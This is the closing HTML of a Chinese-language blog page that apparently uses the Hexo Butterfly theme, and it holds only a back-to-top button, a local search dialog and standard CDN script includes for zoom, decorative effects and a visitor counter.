id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
